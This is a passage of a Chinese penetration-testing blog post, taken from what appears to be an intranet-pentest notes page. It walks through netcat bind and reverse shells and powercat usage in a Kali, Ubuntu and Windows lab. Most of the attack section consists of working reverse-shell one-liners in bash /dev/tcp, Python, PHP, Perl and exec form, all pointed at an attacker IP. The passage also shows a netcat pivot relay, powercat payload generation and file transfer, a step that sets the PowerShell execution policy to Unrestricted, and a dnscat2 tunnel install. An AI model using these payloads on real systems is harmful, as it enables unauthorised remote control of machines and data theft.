+<h6 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h6><p>客户端连接服务器，客户端获取服务端的shell （kali【攻击机】连接，目标机监听）</p>
+<p>目标机： <code>nc -lvp 8888 -e /bin/sh</code></p>
+<p>攻击机：<code>nc 192.168.0.128 8888</code></p>
+<br>
+
+<p><img src="/posts/3a86f9fc/nc_ubuntu_error.png"></p>
+<p>这里我使用Ubuntu作为目标机器是 使用-e 参数会报错，使用版本不同，这里ubuntu默认版本的nc为netcat-openbsd ，没有-e参数 而netcat-traditional版本[v1.10-41.1] 的存在-e选项，kali也是默认该版本的nc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#给Ubuntu替换一个nc版本 参考https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;91dd4ab317c7</span><br><span class="line">sudo apt-get -y install netcat-traditional </span><br><span class="line"></span><br><span class="line">sudo update-alternatives --config nc </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/3a86f9fc/ubuntu_nc_tra.png"></p>
+<p>成功切换ubuntu的nc版本</p>
+<br>
+
+<p>依旧使用kali作为攻击机，ubuntu作为目标机</p>
+<p>ubuntu: <code>nc -lvp 8888 -e /bin/sh</code></p>
+<p>kali: <code>nc  192.168.0.130 8888</code></p>
+<p><img src="/posts/3a86f9fc/nc_shell1.png"></p>
+<h6 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h6><p>客户端连接服务器，服务器获取客户端的shell（kali【攻击机】监听，目标机连接）</p>
+<p>攻击机：<code>nc -lvp 8888</code></p>
+<p>目标机 ：<code>nc 192.168.0.130 8888 -e /bin/sh</code></p>
+<p>如果是windows <code>nc -lvp lport -e c:\windows\system32\cmd.exe </code></p>
+<p><img src="/posts/3a86f9fc/nc_shell2.png"></p>
+<h6 id="python反向shell"><a href="#python反向shell" class="headerlink" title="python反向shell"></a>python反向shell</h6><p>注意：这里使用的python2进行反弹shell</p>
+<p>攻击机：<code>nc -lvp 8888</code></p>
+<p>目标机：<code>python2 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.128&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></p>
+<p><img src="/posts/3a86f9fc/nc_shell3.png"></p>
+<h6 id="bash反向shell"><a href="#bash反向shell" class="headerlink" title="bash反向shell"></a>bash反向shell</h6><p>攻击机：<code>nc -lvp 8888 </code></p>
+<p>目标机：<code>bash -i &gt;&amp; /dev/tcp/192.168.0.128/8888 0&gt;&amp;1</code></p>
+<p><img src="/posts/3a86f9fc/nc_shell4.png"></p>
+<h6 id="php反向shell"><a href="#php反向shell" class="headerlink" title="php反向shell"></a>php反向shell</h6><p>攻击机：<code>nc -lvp 8888</code></p>
+<p>目标机：<code>php -r &#39;$sock=fsockopen(&quot;192.168.0.128&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
+<p>由于ubuntu没装php环境就不截图演示了</p>
+<h6 id="perl反向shell"><a href="#perl反向shell" class="headerlink" title="perl反向shell"></a>perl反向shell</h6><p>攻击机：<code>nc -lvp 8888</code></p>
+<p>目标机：<code>perl -e &#39;use Socket;$i=&quot;192.168.0.128&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></p>
+<h6 id="内网代理弹shell"><a href="#内网代理弹shell" class="headerlink" title="内网代理弹shell"></a>内网代理弹shell</h6><p><img src="/posts/3a86f9fc/neiwangdaili_shell.jpg"></p>
+<p>kali执行:<code>nc -lvp 3333</code><br>数据库执行:<code>nc -lvp 3333 -e /bin/sh</code><br>web服务器执行：<code>nc -v 192.168.1.4 3333 -c &quot;nc -v 1.1.1.200 3333&quot;</code></p>
+<p>原理：web服务器当作中间机，连接kali和数据库的3333端口，使kali与数据库通信</p>
+<h6 id="exec反弹shell"><a href="#exec反弹shell" class="headerlink" title="exec反弹shell"></a>exec反弹shell</h6><p>攻击机：<code>nc -lvp 8888</code></p>
+<p>目标机：<code>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/192.168.0.128/8888; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></p>
+<p><img src="/posts/3a86f9fc/nc_shell5.png"></p>
+<br>
+
+<p>可以利用python2 变为交互式的shell <code>python2 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<p>或<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<hr>
+<h5 id="powercat使用"><a href="#powercat使用" class="headerlink" title="powercat使用"></a>powercat使用</h5><p>powercat可以理解成powershell版的natcat,</p>
+<p>下载地址： <a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p>
+<p>下载下来的powercat.ps1文件 进行导入<code> Import-Module .\powercat.ps1</code></p>
+<p>如果权限不足 以管理员身份打开powershell<code>Set-ExecutionPolicy Unrestricted</code>输入Y</p>
+<p><code>Get-ExecutionPolicy</code>查看当前ps权限</p>
+<p> <code>powercat -h</code>测试是否导入成功</p>
+<p><img src="/posts/3a86f9fc/powercat1.png"></p>
+<br>
+
+<p>在win10中更改poweshell权限 <code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe </code>以管理员权限运行，在本机进行尝试时，每次导入模块后系统都会将powercat.ps1删除掉…</p>
+<br>
+
+<br>
+
+<blockquote>
+<p>#powercat  命令参数</p>
+<p>-l 监听模式</p>
+<p>-p 指定监听端口</p>
+<p>-e 指定启动进程的名称</p>
+<p>-v 显示详情</p>
+<p>-c 指定想要连接的 IP 地址</p>
+<p>-ep 返回 powershell -dns 使用 dns 通信</p>
+<p>-g 生成 payload -ge 生成经过编码的 payload，可以直接使用 powershell </p>
+<p>-e 执行该 payload</p>
+<br>
+</blockquote>
+<h6 id="通过nc正向连接powercat"><a href="#通过nc正向连接powercat" class="headerlink" title="通过nc正向连接powercat"></a>通过nc正向连接powercat</h6><p>win7：<code>powercat -l -p 8888 -e cmd.exe -v</code></p>
+<p>kali：<code>nc 192.168.0.129 8888</code></p>
+<p><img src="/posts/3a86f9fc/powercat_shell1.png"></p>
+<h6 id="通过nc反向连接powercat"><a href="#通过nc反向连接powercat" class="headerlink" title="通过nc反向连接powercat"></a>通过nc反向连接powercat</h6><p>kali：<code>nc -l -p 8888 -v </code></p>
+<p>win7：<code>powercat -c 192.168.0.128 -p 8888 -v -e cmd.exe</code></p>
+<h6 id="返回powershell"><a href="#返回powershell" class="headerlink" title="返回powershell"></a>返回powershell</h6><p>win7：<code>powercat -l -v -p 8888</code></p>
+<p>win2008：<code>powercat -c 192.168.0.129 -p 8888 -v -ep</code></p>
+<h6 id="powercat文件传输"><a href="#powercat文件传输" class="headerlink" title="powercat文件传输"></a>powercat文件传输</h6><p>win7：<code>Powercat -l -p 8888 -of test.txt -v</code></p>
+<p>win2008：<code>Powercat -c 192.168.0.129 -p 8888 -i c:\test.txt -v</code></p>
+<h6 id="powercat-生成paylaod"><a href="#powercat-生成paylaod" class="headerlink" title="powercat 生成paylaod"></a>powercat 生成paylaod</h6><p>win7： <code>powercat -l -p 8888 -e cmd.exe -g &gt; shell.ps1</code> 将shell.ps1传到win2008</p>
+<p>win2008：<code>powercat -c 192.168.0.129 -p 8888 -v</code></p>
+<p>或者</p>
+<p>win7：<code>powercat -c 192.168.0.129</code></p>
+<h6 id="创建dns隧道连接"><a href="#创建dns隧道连接" class="headerlink" title="创建dns隧道连接"></a>创建dns隧道连接</h6><p>在kali上安装discat</p>
+<blockquote>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2.git">https://github.com/iagox86/dnscat2.git</a><br>cd dnscat2/server/<br>gem install bundler<br>bundle install</p>
+</blockquote>
+<p>同时安装ruby环境</p>
+<br>
+
+<br>
+
+<hr>
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/intranet/index.html">https://websec.readthedocs.io/zh/latest/intranet/index.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://c.wgpsec.org/p/10053">https://c.wgpsec.org/p/10053</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.icode9.com/content-3-780098.html">https://www.icode9.com/content-3-780098.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://yoga7xm.top/2019/03/27/IPentest-discover/">https://yoga7xm.top/2019/03/27/IPentest-discover/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/12378110.html">https://www.cnblogs.com/-chenxs/p/12378110.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://soapffz.com/sec/21.html">https://soapffz.com/sec/21.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/243115.html">https://www.freebuf.com/sectool/243115.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://teamssix.com/year/210601-155103.html">https://teamssix.com/year/210601-155103.html</a></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+<div>
+
+  <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------------- 💖 🌞 本 文 结 束 😚 感 谢 您 的 阅 读 🌞 💖 -------------</div>
+    
+</div>
+
+</div>
+
+<div>
+      
+        
+      
+</div>
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"></i><i class="fa fa-tag"></i> 内网渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/c20f4593/" rel="prev" title="HiBOS酒店宽带运营系统RCE漏洞POC">
+      <i class="fa fa-chevron-left"></i> HiBOS酒店宽带运营系统RCE漏洞POC
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/14f5ef78/" rel="next" title="E:dpkg被中断，您必须手工运行sudodpkg">
+      E:dpkg被中断，您必须手工运行sudodpkg <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF"><span class="nav-number">1.1.</span> <span class="nav-text">网络信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="nav-number">1.2.</span> <span class="nav-text">用户信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF"><span class="nav-number">1.3.</span> <span class="nav-text">进程信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.4.</span> <span class="nav-text">本机信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99"><span class="nav-number">1.5.</span> <span class="nav-text">防火墙</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">域内信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E5%9F%9F"><span class="nav-number">2.1.</span> <span class="nav-text">判断是否有域</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-number">2.2.</span> <span class="nav-text">域内存活主机探测</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8EICMP"><span class="nav-number">2.2.1.</span> <span class="nav-text">基于ICMP</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Earp"><span class="nav-number">2.2.2.</span> <span class="nav-text">基于arp</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Eudp"><span class="nav-number">2.2.3.</span> <span class="nav-text">基于udp</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8ENetBIOS"><span class="nav-number">2.2.4.</span> <span class="nav-text">基于NetBIOS</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E5%9F%9F%E5%86%85%E7%AB%AF%E5%8F%A3"><span class="nav-number">2.3.</span> <span class="nav-text">扫描域内端口</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8telnet-%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E6%89%AB%E6%8F%8F"><span class="nav-number">2.3.1.</span> <span class="nav-text">利用telnet 命令进行扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8msf%E6%89%AB%E6%8F%8F%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3"><span class="nav-number">2.3.2.</span> <span class="nav-text">利用msf扫描主机端口</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.4.</span> <span class="nav-text">域内基础信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E5%92%8C%E7%AE%A1%E7%90%86%E5%91%98"><span class="nav-number">2.5.</span> <span class="nav-text">查找域内用户和管理员</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E5%AE%9A%E4%BD%8D%E7%AE%A1%E7%90%86%E5%91%98%E5%B7%A5%E5%85%B7"><span class="nav-number">2.6.</span> <span class="nav-text">内网定位管理员工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Powershell"><span class="nav-number">2.7.</span> <span class="nav-text">Powershell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PowerView%E8%84%9A%E6%9C%AC"><span class="nav-number">2.7.1.</span> <span class="nav-text">PowerView脚本</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BloodHound"><span class="nav-number">2.8.</span> <span class="nav-text">BloodHound</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="nav-number">3.</span> <span class="nav-text">隐藏通信隧道技术</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E8%BF%9E%E9%80%9A%E6%80%A7%E5%88%A4%E6%96%AD"><span class="nav-number">3.1.</span> <span class="nav-text">内网连通性判断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E5%B1%82%E9%9A%A7%E9%81%93"><span class="nav-number">3.2.</span> <span class="nav-text">网络层隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ICMP%E9%9A%A7%E9%81%93"><span class="nav-number">3.2.1.</span> <span class="nav-text">ICMP隧道</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#icmpsh%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">3.2.2.</span> <span class="nav-text">icmpsh反弹shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PingTunnel%E4%BD%BF%E7%94%A8"><span class="nav-number">3.2.3.</span> <span class="nav-text">PingTunnel使用</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%A0%E8%BE%93%E5%B1%82%E9%9A%A7%E9%81%93"><span class="nav-number">3.3.</span> <span class="nav-text">传输层隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#lcx%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-number">3.3.1.</span> <span class="nav-text">lcx端口转发</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#netcat"><span class="nav-number">3.3.2.</span> <span class="nav-text">netcat</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96banner%E4%BF%A1%E6%81%AF"><span class="nav-number">3.3.2.1.</span> <span class="nav-text">获取banner信息</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">3.3.2.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E4%B8%BB%E6%9C%BA"><span class="nav-number">3.3.2.3.</span> <span class="nav-text">远程连接主机</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3"><span class="nav-number">3.3.2.4.</span> <span class="nav-text">监听端口</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="nav-number">3.3.2.5.</span> <span class="nav-text">文件传输</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%AE%80%E6%98%93%E8%81%8A%E5%A4%A9"><span class="nav-number">3.3.2.6.</span> <span class="nav-text">简易聊天</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#nc%E8%8E%B7%E5%8F%96shell"><span class="nav-number">3.3.3.</span> <span class="nav-text">nc获取shell</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%AD%A3%E5%90%91shell"><span class="nav-number">3.3.3.1.</span> <span class="nav-text">正向shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%8F%8D%E5%90%91shell"><span class="nav-number">3.3.3.2.</span> <span class="nav-text">反向shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#python%E5%8F%8D%E5%90%91shell"><span class="nav-number">3.3.3.3.</span> <span class="nav-text">python反向shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#bash%E5%8F%8D%E5%90%91shell"><span class="nav-number">3.3.3.4.</span> <span class="nav-text">bash反向shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#php%E5%8F%8D%E5%90%91shell"><span class="nav-number">3.3.3.5.</span> <span class="nav-text">php反向shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#perl%E5%8F%8D%E5%90%91shell"><span class="nav-number">3.3.3.6.</span> <span class="nav-text">perl反向shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E5%BC%B9shell"><span class="nav-number">3.3.3.7.</span> <span class="nav-text">内网代理弹shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#exec%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">3.3.3.8.</span> <span class="nav-text">exec反弹shell</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#powercat%E4%BD%BF%E7%94%A8"><span class="nav-number">3.3.4.</span> <span class="nav-text">powercat使用</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%80%9A%E8%BF%87nc%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5powercat"><span class="nav-number">3.3.4.1.</span> <span class="nav-text">通过nc正向连接powercat</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%80%9A%E8%BF%87nc%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5powercat"><span class="nav-number">3.3.4.2.</span> <span class="nav-text">通过nc反向连接powercat</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%BF%94%E5%9B%9Epowershell"><span class="nav-number">3.3.4.3.</span> <span class="nav-text">返回powershell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#powercat%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="nav-number">3.3.4.4.</span> <span class="nav-text">powercat文件传输</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#powercat-%E7%94%9F%E6%88%90paylaod"><span class="nav-number">3.3.4.5.</span> <span class="nav-text">powercat 生成paylaod</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%9B%E5%BB%BAdns%E9%9A%A7%E9%81%93%E8%BF%9E%E6%8E%A5"><span class="nav-number">3.3.4.6.</span> <span class="nav-text">创建dns隧道连接</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mamor"
+      src="/images/kabi.jpg">
+  <p class="site-author-name" itemprop="name">Mamor</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">64</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Mamor5409" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Mamor5409" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mamor</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">208k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:09</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+<!--
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共52.8k字</span>
+</div>
+-->
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/ClickShowText.js"></script>
+
+<script type="text/javascript">
+var windowWidth = $(window).width();
+if (windowWidth > 768) {
+    document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+}
+</script>
+
+
+
+
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
